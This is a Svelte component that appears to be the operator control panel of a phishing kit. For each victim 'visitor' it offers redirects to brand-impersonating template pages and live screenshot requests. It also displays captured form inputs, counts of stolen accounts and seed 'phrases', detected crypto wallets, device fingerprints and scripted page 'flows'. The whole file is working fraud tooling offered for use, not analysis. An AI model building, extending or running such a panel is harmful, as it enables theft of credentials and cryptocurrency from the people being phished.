<script lang="ts">
	import { X, Send, Monitor, Database, Fingerprint, GitGraph, Camera, ChevronDown, Check, RotateCw, Trash2 } from 'lucide-svelte';
	import { sendMessage, flows } from '$lib/stores/websocket';
	import { templates, getAllPages, getRouteForKey, type TemplateInput } from '$lib/templates';
	import { previewUrl } from '$lib/visitorTemplates';
	import type { Visitor, FlowStep } from '$lib/server/state';

	let { visitor, onclose }: { visitor: Visitor; onclose: () => void } = $props();

	let activeTab = $state<'redirect' | 'page' | 'screenshot' | 'data' | 'fingerprint' | 'flow'>('redirect');

	let selectedTemplate = $state(visitor.lastPage || '');
	let inputValues = $state<Record<string, string>>({});
	let screenshotSrc = $state('');
	let selectedFlow = $state('');

	const allPages = getAllPages();

	const tabs = [
		{ id: 'redirect' as const, label: 'Redirect', icon: Send },
		{ id: 'page' as const, label: 'Page', icon: Monitor },
		{ id: 'screenshot' as const, label: 'Screenshot', icon: Camera },
		{ id: 'data' as const, label: 'Data', icon: Database },
		{ id: 'fingerprint' as const, label: 'Fingerprint', icon: Fingerprint },
		{ id: 'flow' as const, label: 'Flow', icon: GitGraph }
	];

	let currentInputs = $derived.by(() => {
		if (!selectedTemplate) return [];
		const route = getRouteForKey(selectedTemplate);
		return route?.inputs ?? [];
	});

	let templatePreviewSrc = $derived.by(() => {
		if (!selectedTemplate) return '';
		const slash = selectedTemplate.indexOf('/');
		if (slash <= 0) return '';
		const brand = selectedTemplate.slice(0, slash);
		const page = selectedTemplate.slice(slash + 1);
		return previewUrl(brand, page);
	});

	function redirectVisitor() {
		if (!selectedTemplate) return;
		sendMessage('visitor:redirect', { ip: visitor.ip, template: selectedTemplate });
	}

	function updateInputs() {
		sendMessage('visitor:setinputs', { ip: visitor.ip, inputs: inputValues });
	}

	function requestScreenshot() {
		sendMessage('visitor:screen', { ip: visitor.ip });
	}

	function deleteVisitor() {
		sendMessage('visitor:delete', { ip: visitor.ip });
		onclose();
	}

	function assignFlow() {
		if (!selectedFlow) return;
		const flow = $flows.find(f => f.name === selectedFlow);
		if (!flow) return;
		const steps: FlowStep[] = flow.steps.map(s => ({ page: s, passed: false }));
		sendMessage('flow:reorder', { ip: visitor.ip, order: steps });
		sendMessage('visitor:redirect', { ip: visitor.ip, template: flow.steps[0] || '' });
	}

	function clearFlow() {
		sendMessage('flow:clear', { ip: visitor.ip });
	}

	function passStep(idx: number) {
		const steps = [...visitor.flowSteps];
		steps[idx] = { ...steps[idx], passed: true };
		sendMessage('flow:reorder', { ip: visitor.ip, order: steps });
		const next = steps.find(s => !s.passed);
		if (next) {
			sendMessage('visitor:redirect', { ip: visitor.ip, template: next.page });
		}
	}
</script>

<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm" onclick={onclose}>
	<div class="relative flex h-[85vh] w-full max-w-4xl flex-col rounded-xl border border-[var(--border)] bg-[var(--card)] shadow-2xl" onclick={(e) => e.stopPropagation()}>
		<!-- Header -->
		<div class="flex items-center justify-between border-b border-[var(--border)] px-6 py-4">
			<div class="flex items-center gap-4">
				<div class="text-2xl">{visitor.flag}</div>
				<div>
					<div class="flex items-center gap-2">
						<p class="font-mono text-sm font-semibold text-[var(--foreground)]">{visitor.ip}</p>
						<span class="rounded-md border px-2 py-0.5 text-[10px] font-medium {visitor.status === 'online' ? 'border-[var(--status-live)]/30 bg-[var(--status-live)]/10 text-[var(--status-live)]' : 'border-[var(--border)] text-[var(--muted-foreground)]'}">
							{visitor.status}
						</span>
					</div>
					<p class="mt-0.5 text-xs text-[var(--muted-foreground)]">{visitor.city}, {visitor.country} · {visitor.lastPage || 'No page'}</p>
				</div>
			</div>
			<div class="flex items-center gap-2">
				<button onclick={deleteVisitor} class="rounded-lg p-2 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]" title="Delete visitor">
					<Trash2 size={16} />
				</button>
				<button onclick={onclose} class="rounded-lg p-2 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">
					<X size={18} />
				</button>
			</div>
		</div>

		<!-- Tabs -->
		<div class="flex gap-1 border-b border-[var(--border)] px-6">
			{#each tabs as tab}
				<button
					onclick={() => (activeTab = tab.id)}
					class="flex items-center gap-2 border-b-2 px-4 py-3 text-xs font-medium transition-colors {activeTab === tab.id ? 'border-[var(--accent-primary)] text-[var(--text-accent)]' : 'border-transparent text-[var(--muted-foreground)] hover:text-[var(--foreground)]'}"
				>
					<tab.icon size={14} />
					{tab.label}
				</button>
			{/each}
		</div>

		<!-- Content -->
		<div class="flex-1 overflow-y-auto p-6 custom-scrollbar">
			{#if activeTab === 'redirect'}
				<div class="space-y-5">
					<div>
						<label class="mb-2 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Template Page</label>
						<select bind:value={selectedTemplate} class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
							<option value="">Select page...</option>
							{#each Object.entries(templates) as [brand, def]}
								<optgroup label={brand}>
									{#each Object.keys(def.routes) as page}
										<option value="{brand}/{page}">{brand} — {page}</option>
									{/each}
								</optgroup>
							{/each}
						</select>
					</div>

					{#if selectedTemplate}
						<div class="rounded-lg border border-[var(--border)] bg-white overflow-hidden">
							<div class="border-b border-[var(--border)] bg-[var(--input)]/40 px-4 py-2 text-[11px] font-mono text-[var(--muted-foreground)]">
								Preview: {selectedTemplate}
							</div>
							<div class="h-[300px] bg-white">
								<iframe
									src={templatePreviewSrc}
									title="Template preview"
									class="h-full w-full border-0"
									sandbox="allow-same-origin"
								></iframe>
							</div>
						</div>
					{/if}

					<button onclick={redirectVisitor} disabled={!selectedTemplate} class="btn-accent flex w-full items-center justify-center gap-2 px-4 py-3 text-sm disabled:opacity-50">
						<Send size={15} />
						Redirect Visitor
					</button>
				</div>

			{:else if activeTab === 'page'}
				<div class="space-y-5">
					<div class="rounded-lg border border-[var(--border)] bg-[var(--accent)]/20 p-4">
						<p class="text-sm font-semibold text-[var(--foreground)]">Current Page</p>
						<p class="mt-1 text-xs text-[var(--muted-foreground)]">{visitor.lastPage || 'None assigned'}</p>
					</div>

					{#if currentInputs.length > 0}
						<div class="space-y-4">
							<p class="text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Page Inputs</p>
							{#each currentInputs as input}
								<div>
									<label class="mb-1.5 block text-xs font-medium text-[var(--muted-foreground)]">{input.name}</label>
									{#if input.type === 'select' && input.options?.length}
										<select
											bind:value={inputValues[input.name]}
											class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none focus:ring-2 focus:ring-[var(--accent-glow)]"
										>
											{#each input.options as opt}
												<option value={opt.value}>{opt.label}</option>
											{/each}
										</select>
									{:else}
										<input
											type={input.type === 'number' ? 'number' : 'text'}
											placeholder={input.placeholder}
											bind:value={inputValues[input.name]}
											class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none focus:ring-2 focus:ring-[var(--accent-glow)]"
										/>
									{/if}
								</div>
							{/each}
							<button onclick={updateInputs} class="btn-accent flex items-center gap-2 px-4 py-2.5 text-sm">
								<Send size={14} />
								Update Inputs
							</button>
						</div>
					{:else}
						<p class="text-center text-sm text-[var(--muted-foreground)] py-10">No configurable inputs for the current page</p>
					{/if}

					{#if Object.keys(visitor.inputs).length > 0}
						<div class="space-y-2">
							<p class="text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Captured Inputs</p>
							<div class="rounded-lg border border-[var(--border)] overflow-hidden">
								{#each Object.entries(visitor.inputs) as [key, value]}
									<div class="flex border-b border-[var(--border-subtle)] last:border-0">
										<span class="w-1/3 bg-[var(--input)]/40 px-4 py-2.5 text-xs font-medium text-[var(--muted-foreground)]">{key}</span>
										<span class="flex-1 px-4 py-2.5 font-mono text-xs text-[var(--foreground)]">{value}</span>
									</div>
								{/each}
							</div>
						</div>
					{/if}
				</div>

			{:else if activeTab === 'screenshot'}
				<div class="space-y-4">
					<button onclick={requestScreenshot} class="btn-accent flex items-center gap-2 px-4 py-2.5 text-sm">
						<Camera size={14} />
						Request Screenshot
					</button>
					{#if screenshotSrc}
						<div class="rounded-lg border border-[var(--border)] overflow-hidden">
							<img src={screenshotSrc} alt="Visitor screenshot" class="w-full" />
						</div>
					{:else}
						<div class="flex flex-col items-center justify-center py-20 text-center">
							<Camera size={40} class="mb-3 text-[var(--text-tertiary)]" />
							<p class="text-sm text-[var(--muted-foreground)]">No screenshot captured yet</p>
							<p class="mt-1 text-xs text-[var(--text-tertiary)]">Click the button above to request a live screen capture</p>
						</div>
					{/if}
				</div>

			{:else if activeTab === 'data'}
				<div class="space-y-4">
					<div class="grid grid-cols-3 gap-4">
						<div class="rounded-lg border border-[var(--border)] p-4 text-center">
							<p class="text-2xl font-bold text-[var(--foreground)]">{visitor.accounts}</p>
							<p class="mt-1 text-xs text-[var(--muted-foreground)]">Accounts</p>
						</div>
						<div class="rounded-lg border border-[var(--border)] p-4 text-center">
							<p class="text-2xl font-bold text-[var(--foreground)]">{visitor.phrases}</p>
							<p class="mt-1 text-xs text-[var(--muted-foreground)]">Phrases</p>
						</div>
						<div class="rounded-lg border border-[var(--border)] p-4 text-center">
							<p class="text-2xl font-bold text-[var(--foreground)]">{visitor.uploads}</p>
							<p class="mt-1 text-xs text-[var(--muted-foreground)]">Uploads</p>
						</div>
					</div>

					{#if Object.keys(visitor.inputs).length > 0}
						<div class="rounded-lg border border-[var(--border)] overflow-hidden">
							<div class="border-b border-[var(--border)] bg-[var(--input)]/40 px-4 py-2.5 text-[11px] font-medium uppercase tracking-wider text-[var(--muted-foreground)]">
								<div class="grid grid-cols-2 gap-4">
									<span>Key</span>
									<span>Value</span>
								</div>
							</div>
							{#each Object.entries(visitor.inputs) as [key, value]}
								<div class="border-b border-[var(--border-subtle)] px-4 py-3 last:border-0">
									<div class="grid grid-cols-2 gap-4">
										<span class="text-xs font-medium text-[var(--muted-foreground)]">{key}</span>
										<span class="font-mono text-xs text-[var(--foreground)] break-all">{value}</span>
									</div>
								</div>
							{/each}
						</div>
					{:else}
						<div class="flex flex-col items-center justify-center py-16 text-center">
							<Database size={40} class="mb-3 text-[var(--text-tertiary)]" />
							<p class="text-sm text-[var(--muted-foreground)]">No data captured yet</p>
						</div>
					{/if}

					{#if visitor.wallets.length > 0}
						<div class="space-y-2">
							<p class="text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Wallets Detected</p>
							<div class="flex flex-wrap gap-2">
								{#each visitor.wallets as wallet}
									<span class="rounded-md border border-[var(--border)] bg-[var(--accent)]/30 px-3 py-1.5 text-xs font-medium text-[var(--foreground)]">{wallet}</span>
								{/each}
							</div>
						</div>
					{/if}
				</div>

			{:else if activeTab === 'fingerprint'}
				<div class="space-y-1 rounded-lg border border-[var(--border)] overflow-hidden">
					{#each [
						['IP', visitor.ip],
						['Location', `${visitor.city}, ${visitor.region}, ${visitor.country}`],
						['Flag', visitor.flag],
						['Status', visitor.status],
						['Platform', visitor.platform],
						['Device', visitor.device],
						['Browser', visitor.browser || 'Unknown'],
						['OS', visitor.os || 'Unknown'],
						['Screen', visitor.screenSize || 'Unknown'],
						['Timezone', visitor.timezone || 'Unknown'],
						['CPU Cores', String(visitor.cpuCores || 'Unknown')],
						['Connected', visitor.lastSeen],
						['Current Page', visitor.lastPage || 'None'],
						['Flow', visitor.flow || 'None']
					] as [label, value]}
						<div class="flex border-b border-[var(--border-subtle)] last:border-0">
							<span class="w-1/3 bg-[var(--input)]/40 px-4 py-3 text-xs font-medium text-[var(--muted-foreground)]">{label}</span>
							<span class="flex-1 px-4 py-3 text-xs text-[var(--foreground)]">{value}</span>
						</div>
					{/each}
				</div>

			{:else if activeTab === 'flow'}
				<div class="space-y-5">
					<div class="flex items-end gap-3">
						<div class="flex-1">
							<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Assign Flow</label>
							<select bind:value={selectedFlow} class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
								<option value="">Select flow...</option>
								{#each $flows as flow}
									<option value={flow.name}>{flow.name}</option>
								{/each}
							</select>
						</div>
						<button onclick={assignFlow} disabled={!selectedFlow} class="btn-accent px-4 py-2.5 text-sm disabled:opacity-50">Assign</button>
						{#if visitor.flowSteps.length > 0}
							<button onclick={clearFlow} class="rounded-lg border border-[var(--border)] px-4 py-2.5 text-sm text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Clear</button>
						{/if}
					</div>

					{#if visitor.flowSteps.length > 0}
						<div class="space-y-2">
							<p class="text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Flow Steps</p>
							{#each visitor.flowSteps as step, i}
								<div class="flex items-center gap-3 rounded-lg border border-[var(--border)] p-3 {step.passed ? 'bg-[var(--status-live)]/5 border-[var(--status-live)]/20' : ''}">
									<button
										onclick={() => passStep(i)}
										class="flex h-7 w-7 shrink-0 items-center justify-center rounded-full border-2 transition-colors {step.passed ? 'border-[var(--status-live)] bg-[var(--status-live)] text-white' : 'border-[var(--border)] text-[var(--muted-foreground)] hover:border-[var(--accent-primary)]'}"
									>
										{#if step.passed}
											<Check size={14} />
										{:else}
											<span class="text-[11px] font-bold">{i + 1}</span>
										{/if}
									</button>
									<span class="text-sm {step.passed ? 'text-[var(--muted-foreground)] line-through' : 'text-[var(--foreground)]'}">{step.page}</span>
								</div>
							{/each}
						</div>
					{:else}
						<div class="flex flex-col items-center justify-center py-16 text-center">
							<GitGraph size={40} class="mb-3 text-[var(--text-tertiary)]" />
							<p class="text-sm text-[var(--muted-foreground)]">No flow assigned</p>
							<p class="mt-1 text-xs text-[var(--text-tertiary)]">Select a flow above to assign page steps</p>
						</div>
					{/if}
				</div>
			{/if}
		</div>
	</div>
</div>
